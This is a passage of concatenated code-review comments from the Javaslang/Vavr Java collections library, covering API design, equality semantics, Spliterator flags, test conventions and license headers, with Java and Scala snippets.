a problem. Patterns are generated for ADTs. In particular an ADT is a sum type, which means that it is a disjoint union of several (two) implementations.\nE.g. the ADT List is the union of List.Cons and List.Nil.\nSeq is an interface. There is no unique union of types. But we could create a (head, tail) Pattern 'by hand' for the Traversable type:\n```java\npublic class Quicksort {\npublic static <T, _1 extends T, _2 extends Traversable<T>> Pattern2<Traversable<T>, _1, _2> HeadTail(Pattern<_1, ?> p1, Pattern<_2, ?> p2) {\n    return new Pattern2<T, T1, T2>() {\n            @SuppressWarnings(\"unchecked\")\n            @Override\n            public Option<Tuple2<T1, T2>> apply(T obj) {\n                if (obj instanceof Traversable && ((Traversable) obj).isDefined()) {\n                    final Traversable<T> traversable = (Traversable<T>) obj;\n                    final Tuple2<U1, U2> unapplied = Tuple(traversable.head(), traversable.tail());\n                    return unapplied.apply((u1, u2) ->\n                            ((Pattern<U1, ?>) p1).apply(u1).flatMap(_1 ->\n                            ((Pattern<U2, ?>) p2).apply(u2).map(_2 -> (Tuple2<T1, T2>) unapplied)\n                    ));\n                } else {\n                    return Option.none();\n                }\n            }\n        };\n}\n\n}\n```\nHaven't tried it ... don't know if it compiles.. interesting approach to use Java's assert keyword in unit tests - haven't done that, yet :). @paplorinc I think this test will never run. By convention the maven-surefire-plugin looks for classes that match the following patterns:\n\n**/Test*.java\n**/*Test.java\n**/*TestCase.java\n\n(source: http://maven.apache.org/surefire/maven-surefire-plugin/examples/inclusion-exclusion.html). I want to avoid that we override conversion methods if possible.\nAll types could benefit if we change Value.toArray() instead.\n```java\ninterface Value extends Iterable {\ndefault Object[] toJavaArray() {\n    final Object[] results = new Object[length];\n    int index = 0;\n    for (T value : this) {\n        results[index++] = value;\n    }\n    return results;\n}\n\n}\n```\nDoes it perform well?\n(I think not, you told me a while ago that the iterator method calls (hasNext/next) do not perform well). ... and I think this will most probably not be the bottleneck of an application. I would like to have more common code and less special implementations to reduce the overall complexity of the collection API.. @paplorinc Maybe we could benefit from both ideas, having an iterator() and a visitor().\nWe observe that an iterator() is not as performant as a visitor (because of the additional method calls, see Vector).\nWhat if we add an additional method to Value, say void visit(BiFunction<T, Integer>). I don't know which return type makes most sense here, but I want to mimic the internal Vector visit method.\nGiven that some of the existing collection methods might be implemented in an easier way. Currently I have no example other than changing an array:\n```java\ninterface Value extends Iterable {\ndefault Object[] toJavaArray() {\n    final Object[] results = new Object[length];\n    visit((value, index) -> results[index] = value);\n    return results;\n}\n\n}\n```\nNotes: I know that an index does not make sense for all collections, e.g. HashMap and HashSet. But for Sorted and Linked collections it does make sense, so all Traversables should have that method.\nIf the conversion methods may benefit from the visit method (like toArray()), then Value should have that method, even if it is trivial for single-valued types like Option (beside the empty case).\nLooks like a nice addition to me.... what do you think?\nUpdate: I like the method name iterate more than visit, because iterator() and iterate(BiFunction) are related.\nUpdate 2: It is also a nice alternative to zipWithIndex() because no additional instances (like Tuple2) are created.. Please don't reformat the lines (or at least not different than our formatter).. dito. dito. Mmhh, recently I applied our formatter to the whole code base.\nUnifying is ok. For me it is important that the static <generics> <return-type> <method-name>( is kept in one line. The rest should be done by the formatter.... @vicmosin can you provide a test please? I've overseen it - I'm on a mobile phone.... I think this is a good solution, we can do that. I currently have not a better solution for the synching problem. It is hard to test.\nI'm not that familiar with proper cache invalidation (Weak/Soft-Refs) but we need to keep the tuples in the cache as long as the memoized function is referenced.\n. \ud83d\udc4d . yes, we've misinterpreted the ju.Iterator API before. @paplorinc @zsolt-donca I follow @ruslansennov that the function should not compute a value twice (imagine Math::random). Not sure how we can ensure that a memoized function in GC'ed if not referenced any more but one of its cached values is still in use \ud83e\udd14. I will merge this version in. Memory leaks may also appear in other cases, e.g. when capturing the outer object in a lambda. Optimizations need to be done carefully. Actually we have a working version, which is great. Thx!. Right, this looks better. could you please copy this updated code also to javaslang-test/generator/Generator.scala? Currently we have redundant code :-//\nI will change the Generator in a (near?) future. Currently the maven build process hinders us from having one general Generator import.. In a future Javaslang the patterns will be part of the API class if possible. Then the methods will be generated.\nCurrently I search a way for the following (targeted for 2.1.0):\n$.java will be deprecated (including Patterns.java, which is generated by the annotation processor). The core project 'javaslang' will not depend on javaslang-match any more (currently only compile-time). The patterns will be inlcuded in API, e.g.\n\nTuple(1, 2) should create a Tuple\nTuple($(1), $(2)) should create a Pattern that matches a Tuple\n\nAlso some patterns might change. E.g. Cons(head, tail) and Nil() instead of List(head, tail) and List().. @paplorinc in fact, a supplier seems a bit unnecessary for the fill API. Will put it on the list for 3.0.0 to make it an eager evaluated method parameter instead of a supplied value.. that's a real value!. Nice solution! Guava does it directly with arrays instead of using a StringBuilder. Also Guava's size check and the last array copy (to save mem) are nice:\nhttps://github.com/google/guava/blob/c462d69329709f72a17a64cb229d15e76e72199c/guava/src/com/google/common/base/Strings.java#L142-L166\nWhat do you think, give it a try the 'Guava way'?. A map ~~entry~~. The stream component type.\nor\nThe stream element type.. dito. A new Multimap containing the given map entries. A map ~~entry~~. A new Multimap containing the given map entries. dito. dito. I see that we need implicitly \"map is null\" for the javaMap parameter because of the calling method. It is confusing. Please rename the javaMap parameter to map and map to source or sourceMap. Then the non-null check makes sense again.. We should rename these map parameters then also to source or sourceMap.. dito. 'A' instead of 'An' here. A map ~~entry~~. dito. A new Multimap containing the given map entries. dito. indentation. dito. dito. dito. Does not matter much but I would have created a default: case for the throwing case... maybe a matter of taste. If key is present, tree.put(k,v) needs to return a new instance for Maps and the same instance for Sets. Therefore we currently perform an additional 'contains' check for Sets. A future optimization may add an additional flag replace to the backing HAMT.put() / RedBlackTree.insert() methods. Sets set it to replace=false, Maps set it to replace=true. But for now this solution is working for us.. Yeah! That's one hell of a test method \ud83d\ude0e. can be simplified with\njava\nreturn o == this || (o instanceof Incomparable && Objects.equals(s, ((Incomparable) o).s));\n. would make it final because of equals() instanceof check. same as Objects.hashCode(s);. I would not provide a default implementation for AbstractMultimapTest.emptyMap() because now we have to cast every emptyMap() result.\nShould not be a big problem, we have only three impls in our test classes.. I feel guilty of writing this dirty-typed method.. dito. Great!. @paplorinc \"exact same instance\" is the best be can do because function equality is undecidable. Ok: A is abstract, B and C extend A, they inherit hashCode and override equals.. see above. see above. It is intended to test that corner case here!. It is intended to test that corner case here!. It is intended to test that corner case here!. It is intended to test that corner case here!. It is intended to test that corner case here!. It is intended to test that corner case here!. It is intended to test that corner case here!. cleanup. Yes, will do. Have to burn it into my brain windings that relection isn't gwt compatible :). Matches before instanceOf(Traversable.class) is checked, so it is ok.. In 3.0.0 Iterator will not implement Traversable any more (i.e. all internal ofAll(iterator) calls will be substituted with ofAll(() -> iterator)). So all Traversables will be Serializable.. Do you think it is better to carry our deprecated methods into the next major version? We have several breaking API changes. Removing all unnecessary things makes Javaslang simpler. However, we should provide a migration plan to our users.. Nice one!. Please add a\njava\nObjects.requireNonNull(computation, \"computation is null\");. Please add a\njava\nObjects.requireNonNull(computation, \"computation is null\");. Please add a\njava\nObjects.requireNonNull(computation, \"computation is null\");. Please add a\njava\nObjects.requireNonNull(computation, \"computation is null\");. Scala's grouped() and sliding() functions return a GroupedIterator<Seq<T>>. That GroupedIterator has the ability of padding and skipping partial results (both not implemented in our version, yet).\nIt would be nice if we could provide the same functionality. Returning a GroupedIterator<Seq<T>> instead of Iterator<Seq<T>> will not be backward compatible. I will target that change for 3.0.0. Note: I internally based the buffer on our persistent Vector, Scala users a mutable ArrayBuffer. Our version is blazing fast (a little slower than the mutable version). Congrats @paplorinc !!!. Yes, I'm also not satisfied with the fill() method. I will re-write it.... Yes, I had if (count == 0) but replaced it. But count == 0 is better.. Yes, I first separated it into an if branch but there was duplicate code. Will try to do better.. Yes, I fused two statements:\njava\nfilled = true;\nreturn true;. (Btw - how cool is that: assignment is an expression in Java. Unbelievable!). @paplorinc \n\nIt's difficult for me to understand it if it's intertwined :)\n\nLook at this 'beauty'. This is really a lovely method.\nName\nI like the name.\nThe method is similar to groupBy(). I first thought about naming it groupDistinctBy() but the 'group' part suggests that there may be several elements grouped together. That contradicts the 'distinct' part of the name. 'Arranging' elements is perfect!\nSignature\nBecause groupBy() and arrangeBy() are so similar I would suggest to 'sync' their signatures, i.e.\n```java\n Map> groupBy(Function<? super T, ? extends C> classifier);\n Option> arrangeBy(Function<? super T, ? extends C> classifier);\n```\nIn order to make the ? extends C part work, we need to narrow the Map:\njava\ndefault <C> Option<Map<C, T>> arrangeBy(Function<? super T, ? extends C> classifier) {\n    return Option.of(groupBy(classifier).mapValues(Traversable::singleOption))\n            .filter(map -> !map.exists(entry -> entry._2.isEmpty()))\n            .map(map -> Map.narrow(map.mapValues(Option::get)));\n}\nQuestion: Can something bad happen when treating a Map<? extends K, V> as Map<K, V>? We know that persistent/immutable objects are allowed to be narrowed (see this post).\nBut a Map heavily relies on equals/hashCode. If we deal with a type hierarchy, a.equals(b) might be true while b.equals(a) might be false, for A a, B b, where B extends A.\nIf the classifier type Function<? super T, ? extends C> should be Function<? super T, C>, we will have to adjust several other methods in Javaslang, starting with groupBy(Function).\nReturn type\nI thought a minute about returning Option<? extends Map<C, T>> because a LinkedHashMap might want to preserve the insertion order of arranged elements. But we can't preserve the sorted property of a TreeMap because the classifier might not be comparable.\nI think starting with Option<Map<C, T>> is the right way. It behaves like groupBy().\n. Could you please add a @see #groupBy(Function) to the javadoc of arrangeBy()\nand a @see #arrangeBy(Function) to the javadoc of groupBy()?\nI think it is good to promote the new method because it is not known from other libraries.. Do you work with Eclipse? IntelliJ says the <T> in Traversable<T>::singleOption is not needed.. @paplorinc I simplified it.... I don't know if we should really switch to Iterator (instead of AbstractIterator) in version 2.1.0 for slightly better performance...\nIn 3.0.0 I think we should use the faster Iterator (without a pretty toString()).. we do the length() check second now. I did appendAll() before with Vector. List.prependAll() performs better in this use-case. See above. I will add a benchmark.. yes, I forgot, JIT magic. every runtime env? GWT resp Javascript?. if I can sleep better we have gained s.th.. I think about adding appendAll() to Traversable and therefor to Iterator. we could then operate entirely on the Iterator and finally call toList(). Maybe it is simpler to read. However, each operation requires a new Iterator instance.. Mmhh, does not seem to be applicable here.... \ud83d\ude34. I will try it at $work :). I haven't done such measures yet - no clue which tool to use in order to see how things are organized within the JVM \ud83d\ude44 do you have a hint?. I ask myself if SUBSIZED can be omitted here because there is at most one element in a single-valued type. It cannot be splitted anymore.\nBut wait... Java 9 added Optional.stream(). I will ask jshell:\njava\njshell> Optional.of(1).stream().spliterator().characteristics() & Spliterator.SUBSIZED\n$3 ==> 16384\nOk, we need SUBSIZED :). I think we need an additional check for sequential collection (= insertion-order):\njava\nif (isSequential()) {\n    characteristics |= Spliterator.ORDERED;\n}\n\nSpecs:\njava\ninterface Traversable<T> {\n    /**\n     * Checks if the elements of this Traversable appear in encounter order.\n     *\n     * @return true, if the insertion order of elements is preserved, false otherwise.\n     */\n    default boolean isSequential() {\n        return false;\n    }\n}\nPlease insert the new method right below Traversable isOrdered().\nPlease add also a link to this method to the javadoc of the Traversable class:\njava\n...\n * Tests:\n *\n * <ul>\n * <li>{@link #existsUnique(Predicate)}</li>\n * <li>{@link #hasDefiniteSize()}</li>\n * <li>{@link #isDistinct()}</li>\n * <li>{@link #isOrdered()}</li>\n * <li>{@link #isSequential()}</li>\n * <li>{@link #isTraversableAgain()}</li>\n * </ul>\n...\nThe following collection types need to override isSequential() by returning true:\n\nSeq\nLinkedHashSet\nLinkedHashMap\nLinkedHashMultimap\nTree\nIterator\n. Please add else here to make it clear that this if should stay the last statement:\n\njava\nif (hasDefiniteSize()) {\n    ...\n    return ...;\n} else {\n    return ...;\n}. The super impl Spliterator.getComparator() throws an IllegalStateException by default.\nIs it really necessary to return null? If null is used somewhere it will throw a NPE, which is roughly the same as throwing an IllegalStateException.\nI'm just curious - I'm sure there is a reason!. dito. @paplorinc\nNot sure if it is fair that slang operation on an array while scala operates of a list buffer...\nI will force scala's Iterator to operate on an IndexedSeq by using an Array wrapper.... Great, thank you \ud83d\udc4d\ud83c\udffc. oh, forgot to remove the comment. minor: please add the else here. assertion .isTrue() missing. dito. dito. dito. assertion .isTrue() missing. dito. see below\n. This is not completely correct. 'Semantic' versioning does not mean the semantics of the application. It gives the  version numbers of a release a semantic meaning.\nFrom the site Semantic Versioning:\n\nGiven a version number MAJOR.MINOR.PATCH, increment the:\nMAJOR version when you make incompatible API changes,\nMINOR version when you add functionality in a backwards-compatible manner, and\nPATCH version when you make backwards-compatible bug fixes.\nAdditional labels for pre-release and build metadata are available as extensions to the MAJOR.MINOR.PATCH format.\n\nLine 223 has to be changed accordingly. A major release is not backward compatible.. We don't need the explicit null check, the combination of map1 == obj and instanceof-check is equivalent.\nAlso I would rename map1 to source. We've done it in other Collections.* methods also.\nLet's do the following. We do not need to use raw types. Because of type erasure the result is the same at runtime.\njava\n// I think this will not work for all cases mentioned below\n@SuppressWarnings(\"unchecked\")\nstatic <K, V> boolean equals(Map<K, V> source, Object o) {\n    if (o == source) {\n        return true;\n    } else if (o instanceof Map) {\n        final Map<K, V> that = (Map<K, V>) o;\n        return source.size() == that.size() && source.forAll(that::contains);\n    } else {\n        return false;\n    }\n}\nIn the following we use import scala.collection.immutable._.\nQuestion 1\nWe have contains(T), Java has contains(Object). In a different implementation contains could return just false if the types aren't comparable / assignable. However, I think our impl will currently throw a ClassCastException!? We should check that with a unit test, e.g. equals(Map<String, A>, Map<Int, A>).\n```scala\nscala> val set1: Set[Int] = Set(1, 2, 3)\nset1: scala.collection.immutable.Set[Int] = Set(1, 2, 3)\nscala> val set2: Set[String] = Set(\"1\", \"2\", \"3\")\nset2: scala.collection.immutable.Set[String] = Set(1, 2, 3)\nscala> set1 == set2\nres0: Boolean = false\nscala> set2 == set1\nres1: Boolean = false\n```\nOk, no ClassCastException.\nQuestion 2\nAnother important question is what happens if we call equals(SortedSet, Set) or equals(Set, SortedSet). The sorted sets use a Comparator instead of the equals method. If the other Set's elements aren't comparable, we will have a problem.\n```scala\nscala> val set1: Set[String] = Set(\"1\", \"2\", \"3\")\nset1: scala.collection.immutable.Set[String] = Set(1, 2, 3)\nscala> val set2: Set[String] = SortedSet(\"1\", \"2\", \"3\")((, ) => 0)\nset2: scala.collection.immutable.Set[String] = TreeSet(3)\nscala> set1 == set2\nres0: Boolean = false\n// this would be true if set2.contains would be used internally\nscala> set2 == set1\nres1: Boolean = false\n```\nThis shows that we can't use the contains() method in the case of SortedSet. But how does it work? The sets look equal...\n```scala\nscala> val set1: Set[Int] = Set(1, 2, 3)\nset1: scala.collection.immutable.Set[Int] = Set(1, 2, 3)\nscala> val set2: SortedSet[Int] = SortedSet(1, 2, 3)((i, j) => j - i)\nset2: scala.collection.immutable.SortedSet[Int] = TreeSet(3, 2, 1)\nscala> set1 == set2\nres0: Boolean = true\nscala> set2 == set1\nres1: Boolean = true\n```\nOk, order does not matter.\nQuestion 3\nWhat happens when calling equals(SortedSet, SortedSet) for two sorted sets having different comparators. We need commutativity here, e.g. equals(set1, set2) == equals(set2, set1) for all sets set1, set2 (especially if set1 == set2). We also need a unit test for this.\n```scala\nscala> val set1: SortedSet[Int] = SortedSet(1, 2, 3)\nset1: scala.collection.immutable.SortedSet[Int] = TreeSet(1, 2, 3)\nscala> val set2: SortedSet[Int] = SortedSet(1, 2, 3)((i, j) => if (i == 3) -1 else i - j)\nset2: scala.collection.immutable.SortedSet[Int] = TreeSet(3, 1, 2)\nscala> set1 == set2\nres0: Boolean = false\nscala> set2 == set1\nres1: Boolean = true\n```\nOk, comparing two SortedSets seems to be different than comparing to Sets. We might need to use introspection, i.e. if both sets are Ordered (i.e. sorted).\n. can be simplified, see above. dito. dito. of course - then before size check:\nsource != null && ... && .... no, wait. source is never null by definition. it is this / the caller!. @v1ctor allright, then we will do the check like this:\njava\n@SuppressWarnings(\"unchecked\")\nstatic <K, V> boolean equals(Map<K, V> source, Object o) {\n    if (o == source) {\n        return true;\n    } else if (source != null && o instanceof Map) {\n        final Map<???, ???> that = (Map<???, ???>) o;\n        return source.size() == that.size() && ???;\n    } else {\n        return false;\n    }\n}\nI will investigate now how to deal with the sorted collections (as mentioned before).. I thought it is a good idea to use Iterable instead of Value. Please change your impl accordingly:\n```java\n    /\n     * Lifts a given {@code Predicate} to a new {@code Predicate} that tests\n     * if an element of an {@code Iterable} satisfies the given {@code Predicate}.\n     \n     * @param predicate A {@code Predicate} that tests elements of type {@code T}\n     * @param  The element type\n     * @return a new {@code Predicate} that tests if a given {@code Iterable} contains an element that satisfies the given {@code predicate}\n     /\n    public static  Predicate> exists(Predicate<? super T> predicate) {\n        Objects.requireNonNull(predicate, \"predicate is null\");\n        return iterable -> Iterator.ofAll(iterable).exists(predicate);\n    }\n/**\n * Lifts a given {@code Predicate} to a new {@code Predicate} that tests\n * if all elements of an {@code Iterable} satisfy the given {@code Predicate}.\n *\n * @param predicate A {@code Predicate} that tests elements of type {@code T}\n * @param <T> The element type\n * @return a new {@code Predicate} that tests if a given {@code Iterable} contains an element that satisfies the given {@code predicate}\n */\npublic static <T> Predicate<Iterable<T>> forAll(Predicate<? super T> predicate) {\n    Objects.requireNonNull(predicate, \"predicate is null\");\n    return iterable -> Iterator.ofAll(iterable).forAll(predicate);\n}\n\n```\nI like your introducing javadoc sentence more.\n. Please add the following tests. They ensure that the generics are right:\n```java\n@Test\npublic void shouldCheckExistsByLiftingPredicateInContravariantPositionToPredicateInCovariantPosition() {\n    final List list = List(1, 2, 3);\n    final Predicate p = n -> n.intValue() % 2 == 0;\n    final boolean actual = Match(list).of(\n            Case(exists(p), true),\n            Case($(), false)\n    );\n    assertThat(actual).isTrue();\n}\n@Test\npublic void shouldCheckForAllByLiftingPredicateInContravariantPositionToPredicateInCovariantPosition() {\n    final List list = List(1, 2, 3);\n    final Predicate p = n -> n.intValue() > 0;\n    final boolean actual = Match(list).of(\n            Case(forAll(p), true),\n            Case($(), false)\n    );\n    assertThat(actual).isTrue();\n}\n```\n. Interestingly it seems a bug in the coverage tool:\n\nI will add the extra lines of code to satisfy it..... oh, typo - will fix it!. yes, will check that!. yep, will do that. thx. yes!. Please move the tests to AbstractTraversableTest. The abstract test class has factory methods that are implemented by all collections, including Iterator. Namely: empty(), of(T), of(T...) and so on.\nI think we already have some of your tests in AbstractTraversableTest. Search for // -- max and // -- min comments.\nPlease use AssertJ syntax for assertions to align with the existing tests.. This is for example a test that already exists in AbstractTraversableTest and a good example for the use of the empty() factory method and the AssertJ assertions:\njava\n@Test\npublic void shouldReturnNoneWhenComputingMaxOfNil() {\n    assertThat(empty().max()).isEqualTo(Option.none());\n}\n. Great, thank you!. Minor: The name could be aligned to the other test names in AbstractTraversableTest, e.g. shouldComputeMaxOfOneValue.. To align it with the other tests we would write:\njava\nassertThat(of(5).max()).isEqualTo(Option.some(5));\nThe benefit is that we additionally verify that a Some(5) is returned. Otherwise (technically) the test would be also green if we change the return type to Try and we return a Success(5).. We already have that test, it can be deleted:\njava\n@Test\npublic void shouldComputeMaxOfInt() {\n    assertThat(of(1, 2, 3).max()).isEqualTo(Option.some(3));\n}\n. this test also exists and can be removed. this test also exists and can be removed. Name: shouldComputeMinOfOneValue\nTest: assertThat(of(5).min()).isEqualTo(Option.some(5)). Please change Iterator.of(...) to just of(...).\nAbstractTraversableTest has a protected method of(T) that is implemented by all Test classes, especially by IteratorTest.\nThank you!. dito. No lambda param type needed, we use the simple form result -> .... Please return filter(partialFunction::isDefinedAt).map(partialFunction::apply);. We try to omit if-branches if possible.. Please use here also\njava\nObjects.requireNonNull(partialFunction, \"partialFunction is null\");\nreturn filter(partialFunction::isDefinedAt).map(partialFunction::apply);\n(Yes, please use map instead of mapTry - I'm sure it makes no difference because of JIT magic).\n. Please reduce the duplicate code in all tests\ndiff\n+        final PartialFunction<Integer, String> pf = new PartialFunction<Integer, String>() {\n+            @Override\n+            public String apply(Integer i) {\n+                return String.valueOf(i);\n+            }\n+            @Override\n+            public boolean isDefinedAt(Integer i) {\n+                return i % 2 == 1;\n+            }\n+        };\nwith this more concise variant:\njava\nfinal PartialFunction<Integer, String> pf = Function1.<Integer, String> of(String::valueOf).partial(i -> i % 2 == 1);\n(or Function1.of(String::valueOf).partial(i -> i % 2 == 1); ???). @tedyoung thank you, that is helpful. I will use nanoTime().. I know that we do not pull the last bit of performance out of the JVM but it is more robust and removes redundant code.. please add an @Override here. Please override the assertThat(Iterable<T> actual) method in LinkedHashMapTest test instead. A super call does inherently rely on the type hierarchy, which is not necessary and error prone.\nInstead LinkedHashMapTest should defined what equality means (even if it looks like duplicate code at a first glance).\n```\n@Override\nprotected  IterableAssert assertThat(Iterable actual) {\n    ...\n}\n``. It is not necessary not to add the entry if the old value/new value are equal, instead we will act likejava.util.HashMap. It will be important when implementing theMapView` later.\n```java\npublic class Test {\npublic static void main(String[] args) {\n\n    A x = new A(1, 1);\n    A y = new A(1, 2);\n\n    // true\n    System.out.println(x.equals(y));\n\n    java.util.Map<Integer, A> map = new java.util.HashMap<>();\n\n    map.put(1, x);\n    map.put(1, y);\n\n    // true\n    System.out.println(map.get(1) == y);\n\n}\n\nstatic class A {\n\n    final int a;\n    final int b;\n\n    A(int a, int b) {\n        this.a = a;\n        this.b = b;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (o == this) {\n            return true;\n        } else if (o instanceof A) {\n            final A that = (A) o;\n            return this.a == that.a;\n        } else {\n            return false;\n        }\n    }\n\n    @Override\n    public int hashCode() {\n        return a;\n    }\n\n    @Override\n    public String toString() {\n        return \"A(a:\" + a + \", b:\" + b + \")\";\n    }\n\n}\n\n}\n```. We changed the equals behavior.\nThis is not correct according to the Traversable.equals() javadoc. We act like Scala, which is:\n```java\nscala> import scala.collection.immutable.\nimport scala.collection.immutable.\nscala> val map1 = ListMap((1, 'a'), (2, 'b'))\nmap1: scala.collection.immutable.ListMap[Int,Char] = ListMap(1 -> a, 2 -> b)\nscala> val map2 = ListMap((2, 'b'), (1, 'a'))\nmap2: scala.collection.immutable.ListMap[Int,Char] = ListMap(2 -> b, 1 -> a)\nscala> map1 == map2\nres0: Boolean = true\n```\nNote: The immutable LinkedHashMap is called ListMap in Scala\n. I would call distinct() later, in the last if branch. Just a thought, no requirement to change it: I think the algorithm could be useful for all IndexSeq impls. I think we only need to make the factory methods wrap and ofAll generic. But I see that the other IndexedSeq impls do not operate on Object[], so maybe it is not possible to make it generic for impls though.. open for extension. re-organized methods according to our contribution guidelines. this is the crucial change. follow-up of #2002 . follow-up of #2002. I think it is IntMultimap resp. Assertion/countMap related. The supplier does not map an element. Could we use the same parameter names like Scala?\nE.g. (modulo generics):\njava\nfold(Supplier ifEmpty, Function f)\nor\njava\nfold(Supplier ifEmpty, Function mapper)\n. minor/just a style-hint (but no need to change it): we generally import Vavr types and fully qualify Java types.. Oh :) I think it is not that important.... I think this test is always green, because the assertion has no check called.\nLet's check the concrete value, i.e.\njava\nassertThat(oneToOne).isEqualTo(Option.some(\"One\"));\n. Dito\njava\nassertThat(oneToOne).isEqualTo(Option.none());\n. @skestle Just recognized that the ::apply is not necessary. Does it compile if you leave it away? Could you please check that, I'm on vacation and have no IDE at hand...\nThx!. I think it is not meant to change the appendix in the license file. The original Apache license has to be untouched.\nI interpret the appendix the way, that java class files should include a header/comment with that content, see Apache Spark for example:\n\nLicense file: https://github.com/apache/spark/blob/master/LICENSE\nHeader: https://github.com/apache/spark/blob/master/core/src/main/java/org/apache/spark/JobExecutionStatus.java\n\nI think we need to change all of our Java file headers.... I've modified it a bit. Please copy/paste the following one:\njava\n/*  __    __  __  __    __  ___\n * \\  \\  /  /    \\  \\  /  /  __/\n *  \\  \\/  /  /\\  \\  \\/  /  /\n *   \\____/__/  \\__\\____/__/\n *\n * Copyright 2014-2017 Vavr, http://vavr.io\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\nThe files in the src-gen folders are generated, i.e. the new header needs also to be included in the generator.scala files.\nI've done these header-changes several times - not really fun :)\nThank you!\n. Following the new 'boy scout rule':\n\nWhen touching public API, we ensure that the Javadoc contains example code.. This simplifies the imperative version that covers the left and the right case, e.g.\n\njava\nSeq rightResult = Seq();\nIterator iter = ...\nwhile (iter.hasNext()) {\n    Either e = iter.next();\n    if (e.isRight()) {\n        /* add e.get() to rightResult */\n    } else {\n        Seq leftResult = Seq(e);\n        while (iter.hasNext()) {\n            Either e2 = iter.next();\n            if (e2.isLeft()) {\n                /* add e2.getLeft() to leftResult */\n            }\n        }\n        return Either.left(leftResult);\n    }\n}\nreturn Either.right(rightResult);\nIterator.partition currently internally uses a Stream to split the original Iterator. This will be improved with #1945 if possible.. great!. does not really matter, but List is most efficient for few values. * we do not need to wrap a traversable-once into a Stream because no element is touched before reduction\n minBy API say that the empty case is already covered.. * we do not need to wrap a traversable-once into a Stream because no element is touched before reduction\n maxBy API say that the empty case is already covered.. it is more efficient to use an Iterator than wrapping every element in a Stream. This catches my eye - the only Map impl that overrides values(). Will double-check, if it is really necessary.... Yep, could be simplified. Now looks like other *Map.values() impls. Inherently: yes - but it was never intended to be lazy. The user should only rely on the properties of the return value: Seq.\nHowever, I've recognized that the Map.values() Javadoc is missing at all. I will add it.. This would lead to a general purpose Seq that is both lazy and memory efficient. Currently we do not have such a collection (neither Scala or Clojure have it for example).\nLazy collections might be infinite, currently they need to evaluate all elements in O(n) in order to compute the size.\nIf we create a new lazy Seq that is aware of its size (because we know we use it in a 'finite' context), we will have the problem that Seq operations like get(int) will be O(n). This is because a lazy collection needs to evaluate all elements up to the requested one.\nOr am I missing something and there could be a way to be lazy and O(1) at the same time (other than wrapping Vector in a lazy, delegating Seq impl)?. @nfekete I like the idea. For example Stream.Cons could have an internal property int size that is -1 if it is unknown.\nIt should be possible to rewrite the Stream factory methods in the way that they gather the size of the input if possible.\nHowever, when we consider the upcoming Java value types, I would love to see value classes.\n```java\nsealed interface Stream { ... }\n// can this be a singleton / e.g. have a private constructor???\nfinal /value/ class Empty extends Stream { ... }\nfinal /value/ class Cons(T head, Supplier> tail) extends Stream { ... }\n```\n(Will data classes be the same? I think there are different things in the Java pipeline.)\nI don't know what is required for the upcoming native Java pattern matching. But a size parameter should not part of the public 'pattern' (aka deconstructor).\nBut I think we can ship it - nobody knows when pattern matching comes to Java and how the constraints will be.\nI will take a look if we can change Stream accordingly this evening. (I'm on the way to a birthday now...). Internally we prefer an imperative impl over the nice and clean foldLeft because we are able to shortcut the computation as soon as we meet a left value. This saves CPU cycles and mem.. It does not seem to be that simple to add a size field to Stream.Cons. For example consider a finite Stream and we call filter(). Because it is lazily evaluated, the size information gets lost.\nMaybe it is better to suppress the size() call during type conversion.\nTherefore I suggest to revert my changes again (toVector() vs. toStream()) and suppress size calculation for lazy Traversables like Stream when converting them to Java collections.\nThe change of Value.java:\ndiff\n     static <T extends java.util.Collection<V>, V> T toJavaCollection(\n             Value<V> value, Function<Integer, T> containerSupplier) {\n-        final int size = (value instanceof Traversable) && ((Traversable) value).isTraversableAgain()\n-                ? ((Traversable<V>) value).size()\n-                : 16;\n+        final int size;\n+        if (value.isSingleValued()) {\n+            size = 1;\n+        } else if (value instanceof Traversable && ((Traversable) value).isTraversableAgain() && !value.isLazy()) {\n+            size = ((Traversable) value).size();\n+        } else {\n+            size = 16;\n+        }\n         final T container = containerSupplier.apply(size);\n         value.forEach(container::add);\n         return container;\n    }\nThis will save us one collection traversal. Another one of course is still needed to add all elements to the target collection.\nWhat do you think @nfekete @chronodm @ruslansennov ?. the additional check !value.isLazy() solves #2020 . Before we used a default initial size of 16. But Java's ArrayList has 10 (hidden in a private field). I think we should use the default as fallback in order to be 'as good as Java'.\n\n(Note: I used IntelliJ IDEA to look into java.util.ArrayList of JDK 1.8.0_144)\nThat the fallback value of 10 will only be taken in the following cases:\n\nWe have a single-valued Value, like Option or Try. Please note that we do not use an initial size of 1 for single-valued type. This is because we return a mutable collection that might be modified by the caller (this is absolutely legitimate!). If the ArrayList has to be resized, it would be counter-productive/too costly to have a size of 1. Therefore we take the default size of 10.\nAnother case, where 10 is taken as initial capacity, is for collections that are traversable once (like Iterator) or when they are lazy (like Stream). The latter case fixes the original issue #2020.. Screenshot taken From the java.util.HashSet source:\n\n\nScreenshot taken From the java.util.HashMap source:\n\n. There was discussion about 'guards' before. We decided to\n\nDo method parameter checks as guards (, like you suggested)\nDo control flow of the method body the 'functional way' as if the if statement where an expression, like in java. Logically the two cases belong to each other. Flattening a method is the imperative way. Some information gets lost. I know that some say the the complexity increases. For me, the readability decreases.\n\nExample of your suggestions below:\n\n. But I agree that the method is too long. Sadly Java has no nested methods.. The if check isn't a problem. Here is a similar Scala code, taken from NonFatal.scala:\n\nInstanceof calls are cheap and take no additional memory like the Map and Function instances you suggested. This is code that is not needed. An if is at the lowest level of the language. I tried to sort the checks in the way that most common primitive types occur first. (However, I have no statistic - it is subjective).\n. This looks great, sorry - I didn't recognized it \ud83d\ude05. Thank you for your feedback! Sometimes keeping the order is more important than a number. E.g. imagine we flatten two scoped blocks to one. No-one hinders someone to change the order of the statements later.\nExample:\njava\nif (condition1) {\n    do;\n    this;\n    and;\n    that;\n} else {\n    throw x;\n}\nif (condition2) {\n    flip;\n    flap;\n} else {\n    throw y;\n}\nThe following might be a valid substitute:\njava\nif (!condition1) {\n    throw x;\n}\nif (!condition2) {\n    throw y;\n}\ndo;\nflip;\nthis;\nand;\nflap;\nthat;\nBut some important information got lost. Do you see what I mean?\nThe cyclomatic complexity analyzer is 'stupid'. It can't look through humans eyes.. @chb0github I thought about the code - I 